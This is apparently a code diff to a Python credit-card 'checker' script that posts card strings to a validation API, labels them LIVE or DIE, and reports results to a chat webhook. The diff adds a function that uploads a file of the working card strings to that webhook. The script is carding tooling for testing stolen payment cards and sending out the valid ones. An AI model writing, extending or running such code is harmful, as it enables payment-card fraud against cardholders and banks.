@@ -24,6 +24,20 @@ def send_embed(title, description, color):
         pass
 
 
+def send_txt_attachment(title, count, file_path):
+    with open(file_path, "rb") as f:
+        payload = {
+            "content": f"**{title}**\nTotal Live: `{count}`"
+        }
+        files = {
+            "file": ("live.txt", f, "text/plain")
+        }
+        try:
+            requests.post(WEBHOOK_URL, data=payload, files=files, timeout=20)
+        except:
+            pass
+
+
 def classify_from_code(code):
     if code == 1:
         return "approved"
@@ -45,70 +59,52 @@ for index, line in enumerate(lines, start=1):
         r = requests.post(API_URL, data={"data": line}, timeout=30)
         data = r.json()
 
-        # 🔹 Main fields
         code = data.get("code", 2)
         status = data.get("status", "Unknown")
         message = data.get("message", "No message")
 
-        # 🔹 Card object (safe reads)
         card = data.get("card", {})
         card_string = card.get("card", line)
-        bank = card.get("bank", "N/A")
-        ctype = card.get("type", "N/A")
-        category = card.get("category", "N/A")
-        brand = card.get("brand", "N/A")
-
-        country = card.get("country", {})
-        country_name = country.get("name", "N/A")
-        country_code = country.get("code", "N/A")
-        country_emoji = country.get("emoji", "")
 
         result = classify_from_code(code)
 
         record = (
             f"string `{card_string}`\n"
             f"status {status}\n"
-            f"message {message}\n\n"
-            f"bank {bank}\n"
-            f"type {ctype}\n"
-            f"category {category}\n"
-            f"brand {brand}\n"
-            f"country {country_name} {country_emoji} ({country_code})"
+            f"message {message}"
         )
 
         if result == "approved":
-            approved.append(record)
+            approved.append(card_string)  # ✅ ONLY LIVE STRING
             send_embed("✅ LIVE", record, 3066993)
 
         elif result == "declined":
-            declined.append(record)
+            declined.append(card_string)
             send_embed("❌ DIE", record, 15158332)
 
         else:
-            unknown.append(record)
+            unknown.append(card_string)
             send_embed("⚠ UNKNOWN", record, 15844367)
 
         print(f"[{index}] {status.upper()} → {message}")
         time.sleep(2.5)
 
     except json.JSONDecodeError:
-        record = f"string `{line}`\nresponse Invalid JSON"
-        errors.append(record)
-        send_embed("🚫 ERROR", record, 9807270)
+        errors.append(line)
+        send_embed("🚫 ERROR", f"string `{line}`\nInvalid JSON", 9807270)
         time.sleep(3)
 
     except Exception as e:
-        record = f"string `{line}`\nerror {e}"
-        errors.append(record)
-        send_embed("🚫 ERROR", record, 9807270)
+        errors.append(line)
+        send_embed("🚫 ERROR", f"string `{line}`\nerror {e}", 9807270)
         time.sleep(3)
 
 
-# Save results
-open("approved.txt", "w").write("\n".join(approved))
-open("declined.txt", "w").write("\n".join(declined))
-open("unknown.txt", "w").write("\n".join(unknown))
-open("error.txt", "w").write("\n".join(errors))
+# ✅ SAVE ONLY LIVE STRINGS
+LIVE_FILE = "live.txt"
+with open(LIVE_FILE, "w", encoding="utf-8") as f:
+    f.write("\n".join(approved))
+
 
 summary = (
     f"✅ Live: {len(approved)}\n"
@@ -118,6 +114,11 @@ summary = (
 )
 
 send_embed("Finished Checking", summary, 5763719)
+
+# ✅ SEND LIVE.TXT AS ATTACHMENT
+if approved:
+    send_txt_attachment("✅ LIVE STRINGS", len(approved), LIVE_FILE)
+
 print("\n✅ DONE CHECKING")
 print(summary)
 
